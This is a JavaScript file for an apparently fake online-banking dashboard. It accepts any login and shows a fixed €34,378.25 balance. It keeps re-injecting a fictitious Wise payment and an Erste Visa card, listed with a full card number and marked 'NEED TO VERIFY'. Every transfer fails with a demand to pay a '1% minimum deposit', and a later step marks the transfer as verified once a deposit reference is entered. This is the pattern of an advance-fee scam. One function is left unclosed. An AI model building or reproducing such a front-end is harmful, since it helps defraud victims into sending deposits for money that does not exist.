// ========== GLOBAL VARIABLES ==========
let currentUser = null;
let isLoggedIn = false;
let transferData = {};
let activationVerified = true; // Ginawang true para laktawan ang activation step

// ========== INITIALIZATION ==========
document.addEventListener('DOMContentLoaded', function() {
    setupEventListeners();
    checkAuthStatus();
    
    // DAGDAG: Awtomatikong pag-inject ng Wise Income kung wala pa sa records
    let transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
    const hasWiseIncome = transactions.some(tx => tx.description.includes("BRANKO MILOS WISE"));
    if (!hasWiseIncome) {
        const wiseIncomeTx = {
            id: 'TXN-WISE-' + Math.floor(100000 + Math.random() * 900000),
            date: "2026-08-20T19:31:00.000Z", // Aug 20, 2026, 7:31 PM
            description: "From BRANKO MILOS WISE",
            status: "Success",
            reference: "Ref: WISE-4750",
            amount: 47.50
        };
        transactions.unshift(wiseIncomeTx);
        localStorage.setItem('transactions', JSON.stringify(transactions));
    }

    // DAGDAG: Awtomatikong pag-inject ng Erste Credit Card sa accounts list kung wala pa
    let creditCards = JSON.parse(localStorage.getItem('creditCards') || '[]');
    const hasErsteCard = creditCards.some(card => card.cardName.includes("ERSTE VISA CREDIT CARD"));
    if (!hasErsteCard) {
        const ersteCardData = {
            cardName: "ERSTE VISA CREDIT CARD",
            balance: "€ 5,000",
            status: "NEED TO VERIFY",
            cardNumber: "4084866310288860",
            validUntil: "***",
            cvv: "***"
        };
        creditCards.push(ersteCardData);
        localStorage.setItem('creditCards', JSON.stringify(creditCards));
    }
});

function setupEventListeners() {
    const hamburger = document.getElementById('hamburger');
    if (hamburger) {
        hamburger.addEventListener('click', toggleMobileMenu);
    }
}

function checkAuthStatus() {
    const savedUser = localStorage.getItem('currentUser');
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
        isLoggedIn = true;
        showLoggedInUI();
        showSection('dashboard');
    }
}

// ========== UI TRANSITIONS / TOGGLES ==========
function toggleSignup() {
    const loginSec = document.getElementById('loginSection');
    const signupSec = document.getElementById('signupSection');
    
    if (loginSec.style.display === 'none') {
        loginSec.style.display = 'block';
        signupSec.style.display = 'none';
    } else {
        loginSec.style.display = 'none';
        signupSec.style.display = 'block';
    }
}

function toggleForgotPassword() {
    const loginSec = document.getElementById('loginSection');
    const forgotSec = document.getElementById('forgotPasswordSection');
    
    if (loginSec.style.display === 'none') {
        loginSec.style.display = 'block';
        forgotSec.style.display = 'none';
    } else {
        loginSec.style.display = 'none';
        forgotSec.style.display = 'block';
    }
}

function toggleMobileMenu() {
    const menu = document.getElementById('navbarMenu');
    if (menu) {
        menu.classList.toggle('active');
    }
}

// ========== AUTHENTICATION (DYNAMIC NAME) ==========
function handleLogin(event) {
    event.preventDefault();
    const username = document.getElementById('loginUsername').value;
    const password = document.getElementById('loginPassword').value;

    if (!username || !password) {
        showNotification('Please fill in all fields', 'error');
        return;
    }

    if (password.length < 6) {
        showNotification('Password must be at least 6 characters', 'error');
        return;
    }
    const savedUser = localStorage.getItem('currentUser');
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
    } else {
        currentUser = {
            id: 1,
            name: username, 
            username: username,
            email: username + '@email.com',
            phone: '+385 1 234 5678',
            accountType: 'Premium',
            lastLogin: new Date().toLocaleString(),
            savingsBalance: '+34,378.25',
        };
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
    }

    isLoggedIn = true;
    showNotification('Login successful!', 'success');

    setTimeout(() => {
        showLoggedInUI();
        showSection('dashboard');
    }, 1000);
}

function handleSignup(event) {
    event.preventDefault();
    
    const signupName = document.getElementById('signupName').value;
    const email = document.getElementById('signupEmail').value;
    const phone = document.getElementById('signupPhone').value;
    const password = document.getElementById('signupPassword').value;
    const confirmPassword = document.getElementById('signupConfirmPassword').value;

    if (password !== confirmPassword) {
        showNotification('Passwords do not match', 'error');
        return;
    }

    if (password.length < 6) {
        showNotification('Password must be at least 6 characters', 'error');
        return;
    }

    currentUser = {
        id: 1,
        name: signupName, 
        username: email.split('@'),
        email: email,
        phone: phone || '+385 1 234 5678',
        accountType: 'Premium',
        lastLogin: new Date().toLocaleString(),
        savingsBalance: '+34,378.25',
    };

    isLoggedIn = true;
    localStorage.setItem('currentUser', JSON.stringify(currentUser));
    showNotification('Account created successfully!', 'success');

    setTimeout(() => {
        showLoggedInUI();
        showSection('dashboard');
    }, 1000);
}

function handleForgotPassword(event) {
    event.preventDefault();
    const email = document.getElementById('resetEmail').value;
    showNotification('Password reset link sent to ' + email, 'success');
    toggleForgotPassword();
}

// ========== UI TRANSITIONS ==========
function showLoggedInUI() {
    document.getElementById('loginSection').style.display = 'none';
    document.getElementById('signupSection').style.display = 'none';
    document.getElementById('forgotPasswordSection').style.display = 'none';
    if (document.getElementById('activationSection')) {
        document.getElementById('activationSection').style.display = 'none';
    }
    document.getElementById('navbar').style.display = 'block';

    if (currentUser) {
        const userNameEl = document.getElementById('userName');
        if (userNameEl) userNameEl.textContent = currentUser.name;
        const profileNameEl = document.querySelector('.profile-info .user-name');
        if (profileNameEl) profileNameEl.textContent = currentUser.name;
    }
}

function logout() {
    isLoggedIn = false;
    currentUser = null;
    localStorage.removeItem('currentUser');
    localStorage.removeItem('activationVerified');
    showNotification('Logged out successfully', 'success');

    setTimeout(() => {
        location.reload();
    }, 1000);
}

function showSection(sectionId) {
    const sections = ['dashboard', 'accounts', 'transfers', 'settings'];
    sections.forEach(sec => {
        const el = document.getElementById(sec + 'Section');
        if (el) el.style.display = 'none';
    });

    const target = document.getElementById(sectionId + 'Section');
    if (target) {
        target.style.display = 'block';
    }
    
    if (sectionId === 'dashboard') {
        initializeDashboard();
        loadTransactions();
    }
    
    // DAGDAG: Awtomatikong i-render ang Erste Card kapag pinindot ang Accounts section
    if (sectionId === 'accounts') {
        renderCreditCards();
    }
    
    logPageView(sectionId);
}

// ========== UTILITY FUNCTIONS ==========
function formatCurrency(amount) {
    return '€ ' + parseFloat(amount).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

function formatDate(date) {
    // Custom check para mapanatili ang static format ng bagong transaksyon mo kung ito ay string
    if (typeof date === 'string' && date.includes('2026')) {
        return "Aug 20, 2026";
    }
    return new Date(date).toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric'
    });
}

function showNotification(message, type) {
    alert(type.toUpperCase() + ': ' + message);
}

function logPageView(sectionId) {
    console.log('Navigated to section: ' + sectionId);
}
// ========== ADDITIONAL FEATURES ==========
function addEventListenersToModals() {
    const closeButtons = document.querySelectorAll('.close-btn');
    closeButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const modal = this.closest('.modal');
            if (modal) {
                modal.style.display = 'none';
            }
        });
    });
}
document.addEventListener('DOMContentLoaded', addEventListenersToModals);

// ========== SEARCH FUNCTIONALITY ==========
function searchTransactions(query) {
    const rows = document.querySelectorAll('.transactions-table tbody tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(query.toLowerCase()) ? '' : 'none';
    });
}
// ========== DATE AND TIME ==========
function updateDateTime() {
    const now = new Date();
    const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    };
    return now.toLocaleDateString('en-US', options);
}

function initializeDashboard() {
    const lastLogin = document.getElementById('lastLogin');
    if (lastLogin && currentUser) {
        lastLogin.textContent = 'Last login: Today at ' + new Date().toLocaleTimeString('en-US', { 
            hour: '2-digit', 
            minute: '2-digit' 
        });
    }
}

// ========== LOAD TRANSACTIONS (WISE TRACKER SYSTEM) ==========
function loadTransactions() {
    const tbody = document.querySelector('.transactions-table tbody');
    if (!tbody) return;
    
    const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
    tbody.innerHTML = '';
    
    // DAGDAG: Sapilitang paglalagay ng Wise Income Transaction sa unahan ng listahan
    const fixedWiseTx = {
        date: "Aug 20, 2026",
        description: "FROM BRANKO MILOS WISE",
        status: "Success",
        reference: "Ref: " + Math.floor(1000 + Math.random() * 9000),
        amount: 47.50,
        customTime: "7:31 PM"
    };
    
    const wiseRow = document.createElement('tr');
    wiseRow.innerHTML = `
        <td>Aug 20, 2026 <span style="font-size:0.7rem; color:#888; display:block;">7:31 PM</span></td>
        <td>${fixedWiseTx.description}</td>
        <td><span style="background-color: #5cb85c; color: white; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; display: inline-block;">${fixedWiseTx.status}</span></td>
        <td>${fixedWiseTx.reference}</td>
        <td style="color: #5cb85c; font-weight: bold;">+€ 47.50</td>
    `;
    tbody.appendChild(wiseRow);
    
    if (transactions.length === 0 && !fixedWiseTx) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 20px;">No transactions found.</td></tr>';
        return;
    }

    transactions.forEach(tx => {
        const row = document.createElement('tr');
        
        let statusColor = "#f0ad4e"; 
        if (tx.status === "Success" || tx.status === "Verified & Sent") statusColor = "#5cb85c"; 
        if (tx.status && tx.status.includes("Failed") && !tx.status.includes("Required")) statusColor = "#d9534f"; 

        row.innerHTML = `
            <td>${formatDate(tx.date || new Date())}</td>
            <td>${tx.description || 'Transfer'}</td>
            <td><span style="background-color: ${statusColor}; color: white; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; display: inline-block;">${tx.status || 'Success'}</span></td>
            <td>${tx.reference || '-'}</td>
            <td style="color: ${tx.amount < 0 ? '#d9534f' : '#5cb85c'}; font-weight: bold;">
                ${tx.amount < 0 ? '-' : '+'}${formatCurrency(Math.abs(tx.amount))}
            </td>
        `;
        tbody.appendChild(row);
    });
}

// DAGDAG: Bagong function para ipakita ang Erste Card sa ilalim ng View Accounts section nang hindi ginagalaw ang iba
function renderCreditCards() {
    let accountsContainer = document.getElementById('accountsSection');
    if (!accountsContainer) return;

    let cardWrapper = document.getElementById('ersteCardWrapper');
    if (!cardWrapper) {
        cardWrapper = document.createElement('div');
        cardWrapper.id = 'ersteCardWrapper';
        cardWrapper.style.marginTop = '20px';
        cardWrapper.style.padding = '15px';
        cardWrapper.style.border = '1px solid #ddd';
        cardWrapper.style.borderRadius = '8px';
        cardWrapper.style.backgroundColor = '#f9f9f9';
        accountsContainer.appendChild(cardWrapper);
    }

    cardWrapper.innerHTML = `
        <h3 style="margin-top:0; color:#333;">ERSTE VISA CREDIT CARD</h3>
        <p><strong>Balance:</strong> € 5,000</p>
        <p><strong>Status:</strong> <span style="background-color:#f0ad4e; color:white; padding:2px 6px; border-radius:4px; font-size:0.8rem; font-weight:bold;">NEED TO VERIFY</span></p>
        <div style="font-size: 0.9rem; color: #555; background: #fff; padding: 10px; border-radius: 4px; border: 1px inset #eee;">
            • <strong>Card No:</strong> 4084866310288860<br>
            • <strong>Valid Until:</strong> ***<br>
            • <strong>CVV:</strong> ***
        </div>
    `;
}

// ========== WISE-STYLE INSTANT FAILURE & MANUAL ACCOUNT MATCHING FLOW ==========
function handleTransferSubmit(event) {
    event.preventDefault();

    const recipientName = document.getElementById('recipientName').value.trim();
    const accountNumber = document.getElementById('recipientAccount').value.trim();
    const bank = document.getElementById('recipientBank').value.trim();
    const amount = parseFloat(document.getElementById('transferAmount').value);

    if (!recipientName || !accountNumber || !bank || !amount) {
        showNotification('Please fill in all required fields.', 'error');
        return;
    }

    // DAGDAG: Bagong Failure Alert Logic (Lalabas agad ang failed message at hindi magiging success)
    alert("you need to reach the standard minimum deposit of 1%");

    transferData = {
        id: 'TXN-' + Math.floor(100000 + Math.random() * 900000),
        date: new Date().toISOString(),
        description: `Transfer to ${recipientName} (${bank})`,
        reference: 'Ref: ' + Math.floor(1000 + Math.random() * 9000),
        amount: -amount,
        recipientName: recipientName,
        accountNumber: accountNumber,
        bank: bank,
        status: "Failed (Minimum Deposit 1% Required)" 
    };

    saveTransaction(transferData); 
    
    document.getElementById('transferForm').style.display = 'none';
    
    const alertBox = document.getElementById('wiseVerificationAlertBox');
    const ticketDetails = document.getElementById('ticketDetails');
    
    if (alertBox && ticketDetails) {
        ticketDetails.innerHTML = `
            • <strong>Target Account Holder:</strong> ${recipientName}<br>
            • <strong>Routing Destination:</strong> ${bank} — Account #: ${accountNumber}<br>
            • <strong>Transfer Value:</strong> €${amount.toFixed(2)}<br>
            • <strong>Tracking Status:</strong> Failed. you need to reach the standard minimum deposit of 1%.
        `;
        alertBox.style.display = 'block';
    }
}

function openWiseUploadModal() {
    document.getElementById('wiseUploadModal').style.display = 'block';
}

function closeWiseUploadModal() {
    document.getElementById('wiseUploadModal').style.display = 'none';
}

function handleVerifyDocumentSubmit(event) {
    event.preventDefault();
    
    const referenceInput = document.getElementById('depositRefInput');
    if (referenceInput && referenceInput.value.trim() === '') {
        showNotification('Please provide the validation reference string to confirm identity matchup.', 'error');
        return;
    }

    let transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
    
    transactions = transactions.map(tx => {
        if (tx.id === transferData.id) {
            return { 
                ...tx, 
                status: "Verified & Sent", 
                description: tx.description + " (Direct Sync Verified)" 
            };
        }
        return tx;
    });

    localStorage.setItem('transactions', JSON.stringify(transactions));
    showNotification('Direct verification authenticated! Legal name identity confirmed and full transaction finalized.', 'success');
    
 // ========================================================
// NEW ADDITIONS (APPEND ONLY TO THE VERY BOTTOM OF THE FILE)
// ========================================================

document.addEventListener('DOMContentLoaded', function() {
    executeForcedEnglishRender();
    // Continuous loop to ensure components stay visible during page navigation
    setInterval(executeForcedEnglishRender, 500);
});

function executeForcedEnglishRender() {
    // 1. FORCED VISUAL DISPLAY OF THE ERSTE VISA CREDIT CARD
    let targetGrid = document.querySelector('.accounts-grid');
    if (targetGrid) {
        let cardWrapper = document.getElementById('ersteCardWrapper');
        if (!cardWrapper) {
            cardWrapper = document.createElement('div');
            cardWrapper.id = 'ersteCardWrapper';
            cardWrapper.className = 'account-card-large'; // Gagamitin ang mismong style ng Savings Account mo para magkapareho sila
            cardWrapper.style.marginTop = '20px';
            
            targetGrid.appendChild(cardWrapper);
        }
        
        cardWrapper.innerHTML = `
            <div class="account-header">
                <div>
                    <h3>ERSTE VISA CREDIT CARD</h3>
                    <p class="account-number">4084 8663 1028 8860</p>
                </div>
                <i class="fas fa-credit-card account-icon"></i>
            </div>
            <div class="account-balance">
                <span class="label" style="color: #ff9900; font-weight: bold;">NEED TO VERIFY</span>
                <h2 style="margin-top: 5px;">€ 5,000.00</h2>
            </div>
            <div class="account-footer" style="display: flex; gap: 15px; font-size: 0.85rem; color: #555; background: #fff; padding: 10px; border-radius: 4px; border: 1px inset #eee;">
                <div><strong>Valid Until:</strong> ***</div>
                <div><strong>CVV:</strong> ***</div>
            </div>
        `;
    }

    // 2. FORCED ROW INJECTION FOR THE RECENT TRANSACTIONS TABLE
    const tbody = document.querySelector('.transactions-table tbody');
    if (tbody) {
        if (tbody.innerHTML.includes("No transactions found")) {
            tbody.innerHTML = '';
        }
        if (!tbody.innerHTML.includes("BRANKO MILOS WISE")) {
            const wiseRow = document.createElement('tr');
            wiseRow.innerHTML = `
                <td>Aug 20, 2026 <span style="font-size:0.7rem; color:#888; display:block;">7:31 PM</span></td>
                <td>FROM BRANKO MILOS WISE</td>
                <td><span style="background-color: #5cb85c; color: white; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; display: inline-block;">Success</span></td>
                <td>Ref: WISE-4750</td>
                <td style="color: #5cb85c; font-weight: bold;">+€ 47.50</td>
            `;
            tbody.insertBefore(wiseRow, tbody.firstChild);
        }
    }
}
